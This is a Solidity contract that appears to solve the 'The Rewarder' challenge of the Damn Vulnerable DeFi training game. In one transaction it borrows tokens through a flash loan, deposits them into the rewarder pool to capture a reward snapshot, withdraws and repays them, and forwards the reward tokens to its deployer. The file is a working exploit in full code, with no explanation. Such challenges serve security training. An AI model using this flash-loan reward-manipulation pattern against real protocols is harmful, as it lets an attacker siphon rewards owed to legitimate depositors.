// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract HackTheRewarderPool {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken token;
    RewardToken rewardToken;
    address owner;

    constructor(address flashLoanPoolAddress, address rewarderPoolAddress, address tokenAddress, address rewardTokenAddress) {
        flashLoanPool = FlashLoanerPool(flashLoanPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        token = DamnValuableToken(tokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        owner = msg.sender;
    }

    function hack(uint256 amount) external {
        flashLoanPool.flashLoan(amount);

        uint256 rewardAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, rewardAmount);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        token.transfer(address(flashLoanPool), amount);
    }
}
